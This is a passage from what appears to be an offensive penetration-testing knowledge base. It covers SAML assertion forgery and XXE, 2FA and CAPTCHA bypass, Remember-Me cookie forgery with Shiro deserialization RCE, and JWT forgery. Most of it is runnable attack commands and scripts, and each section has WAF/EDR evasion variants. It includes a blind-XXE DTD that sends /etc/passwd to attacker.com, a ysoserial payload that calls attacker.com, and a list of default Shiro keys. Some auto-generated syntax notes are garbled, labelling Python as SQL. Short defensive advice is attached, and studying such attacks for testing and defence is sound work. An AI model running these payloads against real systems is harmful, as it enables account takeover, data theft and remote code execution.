# The SAMLResponse parameter in POST /saml/acs

# 2. Base64 decode:
echo "SAML_RESPONSE_BASE64" | base64 -d > saml.xml

# 3. Modify the NameID in the assertion (escalate to admin):
# Original: <NameID>user@target.com</NameID>
# Modified: <NameID>admin@target.com</NameID>

# 4. Remove the signature block (remove the entire <Signature>...</Signature>):
xmlstarlet ed -d "//*[local-name()='Signature']" saml.xml > saml_modified.xml

# 5. Re-Base64-encode and replace:
base64 -w0 saml_modified.xml | xclip -sel clip

# 6. Replace the SAMLResponse parameter with the modified value in Burp
```
**Syntax breakdown:**
- `Signature` — XML signature _tag_

**XXE attack**
> SAML is based on XML
```
# SAML XXE injection attack:
# 1. After decoding the SAML Response, inject a DTD after the XML declaration:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<samlp:Response ...>
  <saml:Assertion>
    <saml:Subject>
      <saml:NameID>&xxe;</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>

# 2. Out-of-band data exfiltration (Blind XXE):
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>

# evil.dtd content:
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % payload "<!ENTITY exfil SYSTEM 'http://attacker.com/?d=%data;'>">
%payload;

# 3. Base64-encode and replace the SAMLResponse parameter, then send
```
**Syntax breakdown:**
- `DOCTYPE` — XML entity definition _tag_

**SAML Response tampering and replay**
> SAML Response tampering of identity information and replay attack
_platform: linux_
```
# 1. Intercept the SAML Response:
# Intercept the request POST to /saml/acs in Burp Suite
# The SAMLResponse parameter is Base64-encoded XML

# 2. Decode and modify:
echo "BASE64_SAML_RESPONSE" | base64 -d > saml_resp.xml

# 3. Modify the key fields:
# - NameID: change to the target user (admin@target.com)
# - Audience: ensure it matches the SP
# - Conditions/NotBefore/NotOnOrAfter: ensure the time is valid

# Modify using xmlstarlet:
xmlstarlet ed -N saml="urn:oasis:names:tc:SAML:2.0:assertion"   -u "//saml:NameID" -v "admin@target.com" saml_resp.xml > modified.xml

# 4. Re-encode and submit:
cat modified.xml | base64 -w0 > encoded.txt
curl -d "SAMLResponse=$(cat encoded.txt)&RelayState=/" "http://target.com/saml/acs"

# 5. Replay attack (if InResponseTo/time is not checked):
# Directly replay a previously captured valid SAMLResponse
curl -d "SAMLResponse=PREVIOUSLY_CAPTURED&RelayState=/" "http://target.com/saml/acs"
```
**Syntax breakdown:**
- `NameID` — the field in the SAML assertion that identifies the user's identity _value_
- `InResponseTo` — the request correlation field for anti-replay; if the check is missing it can be replayed _value_
- `xmlstarlet` — an XML editing tool used to modify values in the SAML assertion _command_

**Advanced SAML signature bypass techniques**
> Multiple advanced techniques for SAML signature bypass
_platform: linux_
```
# 1. Signature wrapping attack (XSW - XML Signature Wrapping):
# Move the signed assertion to another location in the XML, inject a malicious assertion
# There are 8 XSW attack variants

# Use SAML Raider (Burp plugin):
# - Intercept the SAMLResponse
# - Choose the XSW attack type (1-8)
# - Modify the NameID to admin
# - Replay

# 2. Signature exclusion (if the SP does not verify the signature):
# Remove the entire <ds:Signature> node in the XML
xmlstarlet ed -N ds="http://www.w3.org/2000/09/xmldsig#"   -d "//ds:Signature" saml_resp.xml > no_sig.xml

# 3. Self-signed certificate substitution:
# Generate a self-signed certificate:
openssl req -new -x509 -days 365 -nodes -newkey rsa:2048   -keyout my.key -out my.crt -subj "/CN=Evil IDP"

# Sign using xmlsec1:
xmlsec1 --sign --privkey-pem my.key --id-attr:ID Assertion saml_resp.xml

# 4. Comment injection bypass:
# admin<!-- -->@target.com may be parsed as admin@target.com
# Inject into the NameID: admin@target.com<!---->.evil.com
```
**Syntax breakdown:**
- `XSW` — XML Signature Wrapping, move the position of the signed node and inject a malicious node _value_
- `xmlsec1 --sign` — re-sign the SAML assertion using a self-signed certificate _command_
- `Comment injection` — use an XML comment to truncate the NameID value _value_

**WAF/EDR Bypass Variants:**

**SAML XML obfuscation to bypass WAF**
> XML encoding obfuscation and multiple format variants to bypass WAF detection of SAML
_platform: linux_
```
# 1. XML encoding obfuscation:
# Wrap the payload with a CDATA section:
<NameID><![CDATA[admin@target.com]]></NameID>

# 2. Define an entity with DTD:
<!DOCTYPE foo [<!ENTITY user "admin@target.com">]>
<NameID>&user;</NameID>

# 3. XML namespace obfuscation:
<saml:NameID xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
             xmlns:x="http://evil.com">admin@target.com</saml:NameID>

# 4. Different ways to encode the SAMLResponse:
# Standard Base64:
cat saml.xml | base64 -w0
# Base64 with newlines:
cat saml.xml | base64
# URL-encoded Base64:
cat saml.xml | base64 -w0 | python3 -c "import sys,urllib.parse; print(urllib.parse.quote(sys.stdin.read()))"

# 5. Deflate+Base64 (accepted by some implementations):
python3 -c "import zlib,base64; print(base64.b64encode(zlib.compress(open('saml.xml','rb').read())).decode())"
```
**Syntax breakdown:**
- `# 1. XML encoding obfuscation:
# Wrap the payload with a CDATA section:
<NameID><![CDATA[admin@ta` — XML content _value_
- `<!DOCTYPE foo [<!ENTITY user "admin@target.com">` — XML declaration/entity definition _tag_
- `]>
<NameID>&user;</NameID>

# 3. XML namespace obfuscation:
<saml:NameID xml` — XML content _value_

**Overview:** SAML authentication vulnerabilities involve advanced attack techniques such as SAML assertion signature bypass, XML Signature Wrapping (XSW) attacks, assertion injection, and replay attacks, which can achieve identity forgery in an enterprise SSO environment, logging into SAML-protected application systems as any user. The scope of impact usually covers the entire enterprise application ecosystem.

**Vulnerability Principle:** Common security flaws in SAML implementations: lax XML signature validation (only verifying that a signature exists without verifying the elements the signature covers), susceptibility to XML Signature Wrapping attacks (XSW, moving the signature position so validation differs from the assertion element actually used), not validating the assertion's Recipient/Audience/NotOnOrAfter attributes, replayable assertions, and XML comment injection to bypass attribute parsing.

**Exploitation Method:** First intercept the SAMLResponse in the normal SAML authentication flow (Base64-decode to obtain the XML), and analyze the signature coverage scope and assertion structure. Test the XSW attack: copy the element referenced by the legitimate signature, insert a forged user identity into the assertion so that signature validation passes but the SP uses the forged assertion. Test XML comment injection: insert a comment into the NameID to truncate the username (such as admin<!--x]-->@evil.com). Test assertion replay and expiration validation.

**Defensive Measures:** Use a security-audited SAML library (such as the OneLogin/OASIS reference implementation); when validating the XML signature, ensure the signature covers the assertion element actually used; strictly validate attributes such as Audience, Recipient, and NotOnOrAfter; implement an assertion unique ID anti-replay mechanism; perform XML Schema validation on the SAML response to prevent injection; enable assertion encryption to protect transport security.

---

### 2FA Bypass  `auth-2fa`
_Bypass two-factor authentication_
Subcategory: **2FA** · tags: `auth` `2fa` `mfa`

**Prerequisites:**
- 2FA is enabled

**Attack Chain:**

**Direct access**
> Forced browsing to bypass the 2FA page
```
# 2FA bypass - forced browsing (directly skip the verification step):
# 1. Log in normally with username and password, reaching the 2FA verification page
# 2. Without entering the verification code, directly access the backend page:
curl -b "session=LOGIN_SESSION_COOKIE" "http://target.com/admin/dashboard" -v
curl -b "session=LOGIN_SESSION_COOKIE" "http://target.com/api/user/profile" -v
curl -b "session=LOGIN_SESSION_COOKIE" "http://target.com/home" -v

# 3. Modify the frontend JS to skip verification:
# Execute in the browser Console:
# window.location = '/dashboard'

# 4. Modify the verification state in the response:
# Burp intercept response: {"2fa_required":true} → {"2fa_required":false}

# 5. Directly call the API (may not check the 2FA state):
curl -b "session=COOKIE" "http://target.com/api/v1/users" -v
```
**Syntax breakdown:**
- `URL` — protected page _path_

**Verification code brute force**
> No rate limit
```
# 2FA verification code brute force:
# 1. TOTP is usually a 6-digit number (000000-999999):
# But there is a 30-second time window, requiring extremely fast brute force

# 2. SMS verification code brute force (4 digits):
# Burp Intruder:
POST /verify-2fa HTTP/1.1
Content-Type: application/json

{"otp":"§0000§","session":"LOGIN_SESSION"}
# Payload: Numbers 0000-9999

# 3. Detect the rate limit:
# Quickly send 10 requests and observe whether it is limited
for i in $(seq 1000 1010); do
  curl -s -o /dev/null -w "%{http_code}" \
    -d "otp=$i&session=SESS" "http://target.com/verify-2fa"
  echo " - $i"
done

# 4. Bypass the rate limit:
# X-Forwarded-For IP rotation
# Modify the User-Agent
# Add a null byte: otp=1234%00
```
**Syntax breakdown:**
- `OTP` — one-time password _parameter_

**Logic bypass**
> Modify the response packet
```
response=true / success=1
```
**Syntax breakdown:**
- `response` — API response field _json_

**WAF/EDR Bypass Variants:**

**Response tampering and direct endpoint access**
> Deceive the frontend into thinking verification passed by intercepting and modifying the 2FA verification response, or bypass the 2FA page to directly access protected endpoints to test whether the server enforces 2FA state validation
```
# Response tampering (Burp intercept):
# Original response: {"success":false,"message":"Invalid OTP"}
# Modified to:       {"success":true,"message":"Valid OTP"}

# Directly skip the 2FA step:
# After login do not access /verify-2fa, directly access:
GET /dashboard HTTP/1.1
Cookie: session=AFTER_LOGIN_SESSION

# Modify the state parameter:
POST /verify-2fa
{"otp":"000000","skip":true}
/verify-2fa?verified=true
```
**Syntax breakdown:**
- `# Response tampering (Burp intercept):` — primary command _command_
- `...` — 11 lines total _value_

**Backup code brute force and verification race condition**
> Dictionary brute force on 2FA backup recovery codes (usually less strictly limited than OTP), and use a race condition to concurrently send multiple OTP verification requests to bypass the rate limit
```
# Backup code brute force (usually 8 digits/letters):
# Use Burp Intruder to brute-force the backup_code parameter
POST /verify-backup-code
{"backup_code":"§12345678§"}
# Check the rate limit and lockout policy

# Race condition:
# Send multiple verification requests simultaneously:
for i in $(seq 000000 000100); do
  curl -s -X POST "http://target.com/verify-2fa"     -b "session=SID" -d "otp=$i" &
done
wait
# Multi-threaded concurrency may bypass the rate limit
```
**Syntax breakdown:**
- `# Backup code brute force (usually 8 digits/letters):` — primary command _command_
- `...` — 13 lines total _value_

**Overview:** Two-factor authentication (2FA) bypass techniques target implementation flaws in second-factor authentication mechanisms such as TOTP, SMS, and email verification codes, bypassing 2FA protection via logic vulnerabilities, brute force, response tampering, direct step skipping, and so on. A successful bypass means account security regresses to password-only protection.

**Vulnerability Principle:** Common flaws in 2FA implementations: insufficient verification code digits (4-6) with no rate limit allowing brute force, the 2FA verification step being skippable (directly accessing post-authentication pages), the verification code not being bound to the session (account A's verification code can verify account B), a predictable backup recovery code generation algorithm, the verification success/failure response being tamperable on the client side, and the 2FA state being stored in a cookie that can be deleted to reset.

**Exploitation Method:** First test direct step skipping: after completing password verification, directly access post-authentication pages without entering the 2FA code. Test brute force: analyze the verification code digits and the response after failure (whether there is a rate limit). Test response tampering: intercept the 2FA verification response and change the failure response to success. Test session binding: use account A's valid verification code to try to verify account B. Test backup codes: analyze the recovery code format and whether the generation algorithm is predictable.

**Defensive Measures:** The verification code should be at least 6 digits and limit the number of daily attempts (such as lockout after 5); the 2FA verification state should be enforced on the server side, not relying on the client cookie or response content; the verification code should be strictly bound to a specific session and user; backup recovery codes should be generated with a cryptographically secure random number; implement an exponential backoff strategy (increasing the wait time on each failure); critical operations should require re-verification of 2FA.

---

### CAPTCHA Bypass  `auth-captcha`
_Bypass graphic CAPTCHAs_
Subcategory: **CAPTCHA** · tags: `auth` `captcha` `bypass`

**Prerequisites:**
- A CAPTCHA exists

**Attack Chain:**

**Reuse**
> The CAPTCHA is not invalidated after single use
```
# CAPTCHA replay attack (verify once, use multiple times):
# 1. Normally obtain and enter the correct CAPTCHA
# 2. Capture the successful request in Burp
# 3. Send the request to Repeater and repeatedly send:
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin&password=§test§&captcha=VALID_CAPTCHA

# 4. If each response is normal (not "verification code error")
#    it means the CAPTCHA is not invalidated after single use, and can be used for brute force

# 5. Combine with Intruder for password brute force:
# Positions: password field
# Payloads: password dictionary
# Fix the captcha field to a known valid value

# Burp Intruder settings: Sniper mode, Payload is the password list
```
**Syntax breakdown:**
- `captcha` — CAPTCHA parameter _parameter_

**Empty value bypass**
> Leave the CAPTCHA parameter empty
```
# CAPTCHA empty value/parameter removal bypass:
# 1. Submit an empty CAPTCHA:
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin&password=test&captcha=

# 2. Submit a null value:
POST /login HTTP/1.1
Content-Type: application/json

{"username":"admin","password":"test","captcha":null}

# 3. Completely remove the captcha parameter:
POST /login HTTP/1.1

username=admin&password=test

# 4. Submit special values:
captcha=0
captcha=undefined
captcha[]=
captcha=true

# 5. Different encoding:
captcha=%00
captcha=%20

# If any method logs in successfully, it means the CAPTCHA validation can be bypassed
```
**Syntax breakdown:**
- `empty` — empty value _value_

**Remove the parameter**
> The backend does not check for the parameter's existence
```
# CAPTCHA parameter removal bypass:
# 1. Original request (with CAPTCHA):
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin&password=test&captcha=abcd

# 2. Remove the captcha parameter in Burp Repeater:
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin&password=test

# 3. Modify the Content-Type to test (may go through different processing logic):
POST /login HTTP/1.1
Content-Type: application/json

{"username":"admin","password":"test"}

# 4. Via the mobile API (may have no CAPTCHA):
POST /api/mobile/login HTTP/1.1
Content-Type: application/json

{"username":"admin","password":"test"}

# 5. Old version API (may have no CAPTCHA):
POST /api/v1/login HTTP/1.1
```
**Syntax breakdown:**
- `remove` — remove the parameter _technique_

**WAF/EDR Bypass Variants:**

**Session reuse and parameter removal bypass**
> Test whether the CAPTCHA is invalidated immediately after use (can be reused), remove the captcha parameter to check whether the backend enforces validation, or pass an empty value, array, or other abnormal type to bypass type checking
```
# Session reuse (CAPTCHA not invalidated after single use):
# 1. Enter the CAPTCHA correctly once
# 2. Subsequent requests continue to use the same captcha value
# Burp Repeater replays the same captcha parameter

# Remove the captcha parameter:
# Original: user=admin&pass=123&captcha=ABCD
# Modified: user=admin&pass=123
# The backend may not validate the missing parameter

# Empty value bypass:
captcha=
captcha=null
captcha=undefined
captcha[]=
```
**Syntax breakdown:**
- `# Session reuse (CAPTCHA not invalidated after single use):` — primary command _command_
- `...` — 13 lines total _value_

**OCR recognition and audio CAPTCHA exploitation**
> Use an OCR tool (Tesseract) to automatically recognize simple graphic CAPTCHAs, use speech recognition as an alternative for audio CAPTCHAs, or check whether the response directly leaks the CAPTCHA value
```
# OCR automatic recognition of graphic CAPTCHAs:
# Python + Tesseract:
import pytesseract
from PIL import Image
img = Image.open("captcha.png")
text = pytesseract.image_to_string(img)
print(text)

# Audio CAPTCHA exploitation:
# Use the Google Speech-to-Text API to recognize the audio CAPTCHA
# Or use Selenium to automatically obtain it + speech recognition

# CAPTCHA response leakage:
# Check whether the response headers, cookies, or hidden fields contain the CAPTCHA value
curl -v "http://target.com/captcha/generate" 2>&1 | grep -iE "captcha|code|verify"
```
**Syntax breakdown:**
- `# OCR automatic recognition of graphic CAPTCHAs:
# Python + Tesseract:
import pytesseract
` — SQL expression _value_
- `from` — SQL keyword _keyword_
- ` PIL import Image
img = Image.open("captcha.png")
text = pytesseract.image_to_string(img)
print(text)

# Audio CAPTCHA exploitation:
# Use the Google Speech-to-Text API to recognize the audio CAPTCHA
# Or use Selenium to automatically obtain it + speech recognition

# CAPTCHA response leakage:
# Check whether the response headers, cookies, or hidden fields contain the CAPTCHA value
curl -v "http://target.com/captcha/generate" 2>&1 | grep -iE "captcha|code|verify"` — SQL expression _value_

**Overview:** CAPTCHA bypass techniques target implementation flaws in human verification mechanisms such as graphic CAPTCHAs, slider CAPTCHAs, and behavioral CAPTCHAs, breaking through CAPTCHA protection via CAPTCHA reuse, response leakage, OCR recognition, interface logic bypass, and so on, making attacks such as brute force, automated scraping, and bulk registration possible again.

**Vulnerability Principle:** Common flaws in CAPTCHA implementations: the CAPTCHA answer is directly returned in the HTTP response (in a hidden field or comment), the CAPTCHA validation is not bound to the business request (the CAPTCHA and the business operation can be sent separately), the token after the CAPTCHA passes can be reused (verify once, use multiple times), simple graphic CAPTCHAs can be recognized with high accuracy by OCR, and the validation parameters of a slider CAPTCHA can be directly constructed.

**Exploitation Method:** First analyze the complete CAPTCHA validation flow (frontend generation/acquisition, user input, backend validation). Check whether the response leaks the CAPTCHA answer (view the HTML source, HTTP response headers, cookies). Test whether the CAPTCHA can be reused (use a passed CAPTCHA token to repeatedly submit the business request). Test whether the request still passes after removing the CAPTCHA parameter. Try OCR recognition on graphic CAPTCHAs (using tools such as Tesseract). Analyze whether the request parameters of a slider CAPTCHA can be directly constructed.

**Defensive Measures:** The CAPTCHA answer should be strictly stored in the server-side session and never returned in the response; the CAPTCHA should be bound to the business request with the same single-use token, invalidated immediately after verification; use a mature CAPTCHA service (such as reCAPTCHA/hCaptcha) to increase recognition difficulty; implement exponential backoff delay for failed requests; combine multi-dimensional risk control mechanisms such as IP reputation, device fingerprint, and behavioral analysis.

---

### Remember Me Vulnerability  `auth-remember-me`
_Remember Me feature vulnerability_
Subcategory: **Session Management** · tags: `auth` `remember-me` `cookie`

**Prerequisites:**
- Remember Me is enabled

**Attack Chain:**

**Cookie forgery**
> Plaintext storage of the username
```
# Remember-Me Cookie forgery:
# 1. Analyze the cookie structure:
# Common format: username|timestamp|hash or base64(username:expiry:hash)
Cookie: remember=admin
Cookie: remember=dXNlcjoxNjk5MDAwMDAwOmFiY2QxMjM0

# 2. Base64 decode and analyze:
echo "dXNlcjoxNjk5MDAwMDAwOmFiY2QxMjM0" | base64 -d
# Output: user:1699000000:abcd1234

# 3. Forge admin's cookie:
echo -n "admin:1999999999:abcd1234" | base64
# Replace the cookie with the generated value

# 4. If a weak hash is used (such as MD5(username+secret)):
# Register a new account → analyze the cookie → derive the secret → forge admin's cookie

# 5. Test:
curl -b "remember=FORGED_VALUE" "http://target.com/dashboard" -v
```
**Syntax breakdown:**
- `remember` — Remember Me Cookie _header_

**Base64 decode**
> Weak encryption or encoding
```
# Remember-Me Cookie decoding and analysis:
# 1. Extract the cookie value:
curl -c cookies.txt -d "username=testuser&password=test123&remember=1" "http://target.com/login"
cat cookies.txt | grep -i remember

# 2. Base64 decode:
echo "COOKIE_VALUE" | base64 -d

# 3. If it is URL encoding + Base64:
python3 -c "import urllib.parse,base64; print(base64.b64decode(urllib.parse.unquote('COOKIE_VALUE')))"

# 4. Try hex decode:
echo "COOKIE_VALUE" | xxd -r -p

# 5. Analyze the decoded structure:
# username:timestamp:hmac
# {"user":"admin","exp":1699999999}
# Serialized object (Java/PHP)

# 6. Check whether it is a known framework's cookie format:
# Shiro: AES-CBC encryption (default key kPH+bIxk5D2deZiIxcaaaA==)
# Django: base64(payload):timestamp:signature
```
**Syntax breakdown:**
- `Base64` — common encoding method _encoding_

**Remember password Token reverse analysis**
> Reverse-analyze the generation logic of the remember-me token
_platform: linux_
```
# 1. Collect multiple remember-me tokens:
for i in $(seq 1 5); do
  token=$(curl -s -c - -d "username=testuser&password=testpass&remember=1"     "http://target.com/login" | grep -i "remember" | awk '{print $NF}')
  echo "Token $i: $token"
  sleep 1
done

# 2. Base64 decode and analyze:
echo "REMEMBER_TOKEN" | base64 -d | xxd | head -20

# 3. Check common formats:
# username:timestamp:hash
# username:md5(password)
# serialized_object (Java: rO0AB... PHP: O:4:...)

# 4. If it is Java serialization (Shiro RememberMe):
echo "REMEMBER_TOKEN" | base64 -d | xxd | head -3
# If it starts with aced0005 → Java serialized object
# If the token is encrypted: try the Shiro default key kPH+bIxk5D2deZiIxcaaaA==

# 5. PHP deserialization check:
echo "REMEMBER_TOKEN" | base64 -d
# If it looks like O:4:"User":2:{s:4:"name";s:5:"admin";...} → PHP serialization
```
**Syntax breakdown:**
- `base64 -d | xxd` — decode the token and view the structure in hexadecimal _command_
- `aced0005` — Java serialization magic bytes, indicating a Java object _value_
- `kPH+bIxk5D2deZiIxcaaaA==` — the default AES key of the Apache Shiro framework _value_

**Shiro RememberMe deserialization RCE**
> Use the Shiro default key + deserialization chain to achieve RCE
```
# The RememberMe Cookie deserialization vulnerability in the Apache Shiro framework
# Principle: AES-CBC encryption (default key) → Base64 encoding → Cookie

# 1. Detect the Shiro framework:
curl -sI "http://target.com/" | grep -i "rememberMe=deleteMe"
# Send an invalid cookie to trigger a characteristic response:
curl -sI "http://target.com/" -b "rememberMe=test" | grep -i "rememberMe"

# 2. Test known Shiro key list:
# kPH+bIxk5D2deZiIxcaaaA==
# 2AvVhdsgUs0FSA3SDFAdag==
# 3AvVhmFLUs0KTA3Kprsdag==
# ...

# 3. Use the ShiroExploit tool:
# java -jar ShiroExploit.jar http://target.com

# 4. Manually construct the payload (requires ysoserial):
java -jar ysoserial.jar CommonsCollections2 "curl http://attacker.com/rce" > payload.ser

# AES encryption:
python3 -c "
import base64
from Crypto.Cipher import AES
import os

key = base64.b64decode('kPH+bIxk5D2deZiIxcaaaA==')
iv = os.urandom(16)
payload = open('payload.ser','rb').read()
# PKCS5Padding
pad = 16 - len(payload) % 16
payload += bytes([pad]) * pad
cipher = AES.new(key, AES.MODE_CBC, iv)
encrypted = iv + cipher.encrypt(payload)
print(base64.b64encode(encrypted).decode())
"
```
**Syntax breakdown:**
- `ysoserial` — Java deserialization payload generation tool _command_
- `CommonsCollections2` — a commonly used deserialization exploit chain (Gadget Chain) _value_
- `AES-CBC + PKCS5Padding` — the encryption method used by Shiro _value_

**WAF/EDR Bypass Variants:**

**Remember-Me Cookie bypass detection**
> Enumerate Shiro keys and different encryption modes to bypass detection
```
# 1. Modify the cookie name case:
curl -b "RememberMe=payload" "http://target.com/"
curl -b "rememberme=payload" "http://target.com/"
curl -b "REMEMBERME=payload" "http://target.com/"

# 2. Shiro key enumeration (encrypt the payload with different keys):
import base64, itertools
from Crypto.Cipher import AES
import os

keys = [
    "kPH+bIxk5D2deZiIxcaaaA==",
    "2AvVhdsgUs0FSA3SDFAdag==",
    "3AvVhmFLUs0KTA3Kprsdag==",
    "4AvVhmFLUs0KTA3Kprsdag==",
    "Z3VucwAAAAAAAAAAAAAAAA==",
    "wGiHplamyXlVB11UXWol8g==",
    "fCq+/xW488hMTCD+cmJ3aQ==",
]

payload = open("payload.ser", "rb").read()
for k in keys:
    try:
        key = base64.b64decode(k)
        iv = os.urandom(16)
        pad = 16 - len(payload) % 16
        padded = payload + bytes([pad]) * pad
        cipher = AES.new(key, AES.MODE_CBC, iv)
        enc = base64.b64encode(iv + cipher.encrypt(padded)).decode()
        print(f"Key: {k} → Cookie length: {len(enc)}")
    except Exception as e:
        print(f"Key: {k} → Error: {e}")

# 3. GCM mode (Shiro 1.4.2+):
# Newer Shiro uses AES-GCM, requiring the corresponding encryption method
```
**Syntax breakdown:**
- `# 1. Modify the cookie name case:
curl -b "RememberMe=payload" "http://target.com/"
curl -b "rememberme=payload" "http://target.com/"
curl -b "REMEMBERME=payload" "http://target.com/"

# 2. Shiro key enumeration (encrypt the payload with different keys):
import base64, itertools
` — SQL expression _value_
- `from` — SQL keyword _keyword_
- ` Crypto.Cipher import AES
import os

keys = [
    "kPH+bIxk5D2deZiIxcaaaA==",
    "2AvVhdsgUs0FSA3SDFAdag==",
    "3AvVhmFLUs0KTA3Kprsdag==",
    "4AvVhmFLUs0KTA3Kprsdag==",
    "Z3VucwAAAAAAAAAAAAAAAA==",
    "wGiHplamyXlVB11UXWol8g==",
    "fCq+/xW488hMTCD+cmJ3aQ==",
]

payload = open("payload.ser", "rb").read()
for k in keys:
    try:
        key = base64.b64decode(k)
        iv = os.urandom(16)
        pad = 16 - len(payload) % 16
        padded = payload + bytes([pad]) * pad
        cipher = AES.new(key, AES.MODE_CBC, iv)
        enc = base64.b64encode(iv + cipher.encrypt(padded)).decode()
        print(f"Key: {k} → Cookie length: {len(enc)}")
    except Exception as e:
        print(f"Key: {k} → Error: {e}")

# 3. GCM mode (Shiro 1.4.2+):
# Newer Shiro uses AES-GCM, requiring the corresponding encryption method` — SQL expression _value_

**Overview:** The "Remember Me" persistent login vulnerability involves security issues such as a reversible Remember-Me Cookie generation algorithm, a predictable key, and deserialization risk. By analyzing or forging the Remember-Me token, an attacker can achieve persistent identity impersonation. A typical case is the Apache Shiro RememberMe deserialization vulnerability (CVE-2016-4437).

**Vulnerability Principle:** Common flaws in the "Remember Me" feature: the cookie value uses reversible encoding (such as Base64) rather than encrypted signature to store user information, the encryption key uses a default value or is hardcoded (such as the Shiro default AES key), the cookie deserializes a Java/PHP object leading to RCE, the cookie is not bound to the client IP or device fingerprint and can be replayed across devices, and the cookie has too long a validity period that cannot be forcibly revoked.

**Exploitation Method:** First obtain the Remember-Me Cookie value and analyze its format (Base64 decode, hexadecimal view). Check whether it is a known framework (such as Shiro) format and test the default key. Analyze whether the cookie contains a tamperable user identifier (such as modifying the user ID or role field). For Java applications, test the deserialization attack (use ysoserial to generate a payload to replace the cookie content). Test whether the cookie can be replayed across IPs/devices.

**Defensive Measures:** Use a cryptographically secure random token as the Remember-Me identifier and do not store user information in the cookie; change the framework's default encryption key (such as Shiro's rememberMe key); prohibit using Java/PHP serialized objects in the cookie; bind the token to the client fingerprint (IP+UA+device ID); set a reasonable validity period (recommended no more than 30 days); provide a logout-all-devices feature to support token revocation.

---

### JWT Authentication Vulnerability  `auth-jwt`
_Use JWT (JSON Web Token) implementation flaws to forge or tamper with the authentication token, achieving unauthorized access or privilege escalation_
Subcategory: **JWT** · tags: `auth` `jwt` `token`

**Prerequisites:**
- The target uses JWT for authentication
- The JWT token can be obtained or intercepted
- The JWT library has a known vulnerability or the server is misconfigured

**Attack Chain:**

**JWT decoding and analysis**
> Decode the JWT Header and Payload to analyze its structure and permission information
```
# Manually decode the JWT (Base64)
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c" | cut -d. -f2 | base64 -d 2>/dev/null

# Decode using jwt_tool:
python3 jwt_tool.py <token>

# Online decoding:
# https://jwt.io/

# Check key fields:
# - alg: signature algorithm (HS256/RS256/none)
# - kid: key ID (may be injectable)
# - typ: token type
# - exp: expiration time
# - role/admin/isAdmin: permission fields
```
**Syntax breakdown:**
- `cut -d. -f2` — split the JWT by the dot and take the second segment (Payload) _command_
- `base64 -d` — Base64-decode the JWT segment _command_
- `alg` — the algorithm field in the JWT header, a common attack point _value_
- `kid` — the Key ID field, may have SQL injection or path traversal _value_

**Algorithm None attack**
> Set the JWT alg field to none, making the server skip signature verification and directly accept the tampered payload
```
# Change alg to none to bypass signature verification
import base64, json

header = {"alg": "none", "typ": "JWT"}
payload = {"user": "admin", "role": "admin", "iat": 1700000000, "exp": 1999999999}

h = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b"=")
p = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b"=")

# Multiple variant bypasses:
alg_variants = ["none", "None", "NONE", "nOnE"]
for alg in alg_variants:
    header["alg"] = alg
    h = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b"=")
    token = h.decode() + "." + p.decode() + "."
    print(f"alg={alg}: {token}")

# Use jwt_tool:
python3 jwt_tool.py <token> -X a  # Algorithm None attack
```
**Syntax breakdown:**
- `alg: "none"` — set the algorithm to none, the server may skip signature validation _value_
- `rstrip(b"=")` — remove the Base64 padding (JWT standard requirement) _command_
- `-X a` — jwt_tool's automatic Algorithm None attack mode _parameter_

**HS256 key brute force**
> Perform a key dictionary brute force on a JWT using HS256 symmetric encryption
_platform: linux_
```
# Use jwt_tool to brute-force the weak key
python3 jwt_tool.py <token> -C -d /usr/share/wordlists/rockyou.txt

# Use hashcat:
hashcat -m 16500 jwt_hash.txt /usr/share/wordlists/rockyou.txt

# Use john:
john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256

# Common weak keys:
# secret, password, 123456, admin, key, test
# company name, project name, domain, etc.

# After confirming the key, forge the JWT:
import jwt
token = jwt.encode({"user":"admin","role":"admin"}, "found_secret", algorithm="HS256")
print(token)
```
**Syntax breakdown:**
- `-C` — jwt_tool's key brute force mode (Crack) _parameter_
- `-d` — specify the dictionary file path _parameter_
- `-m 16500` — the JWT hash mode number in hashcat _value_
- `jwt.encode()` — forge a new JWT using the cracked key _command_

**RS256→HS256 algorithm confusion attack**
> Use RS256/HS256 algorithm confusion, using the public key as the HS256 symmetric key to sign and forge a JWT
_platform: linux_
```
# When the server uses RS256 but accepts HS256:
# 1. Obtain the server public key (usually in /.well-known/jwks.json or /api/keys)
curl -s "http://target.com/.well-known/jwks.json"
curl -s "http://target.com/api/v1/keys"

# 2. Extract the public key
openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -pubkey -noout > pubkey.pem

# 3. Sign the JWT using the public key as the HS256 key
import jwt
public_key = open("pubkey.pem").read()
token = jwt.encode(
    {"user": "admin", "role": "admin"},
    public_key,
    algorithm="HS256"
)
print(token)

# Use jwt_tool:
python3 jwt_tool.py <token> -X k -pk pubkey.pem  # Key confusion attack
```
**Syntax breakdown:**
- `/.well-known/jwks.json` — the standard endpoint for the JWT key set _value_
- `openssl x509 -pubkey` — extract the public key from the certificate _command_
- `-X k` — jwt_tool's key confusion attack mode _parameter_
- `-pk pubkey.pem` — specify the public key file for algorithm confusion _parameter_

**KID parameter injection**
> Use SQL injection or path traversal in the JWT header kid field to control the signature verification key
```
# KID (Key ID) SQL injection:
# Original header: {"alg":"HS256","kid":"key1"}
# Injected header: {"alg":"HS256","kid":"key1' UNION SELECT 'ATTACKER_SECRET' -- "}

import jwt, json, base64

# SQL injection method:
header = {"alg": "HS256", "kid": "x' UNION SELECT 'test' -- "}
token = jwt.encode({"user": "admin"}, "test", algorithm="HS256", headers=header)

# Path traversal method:
header2 = {"alg": "HS256", "kid": "../../dev/null"}
# /dev/null content is empty, the key is an empty string
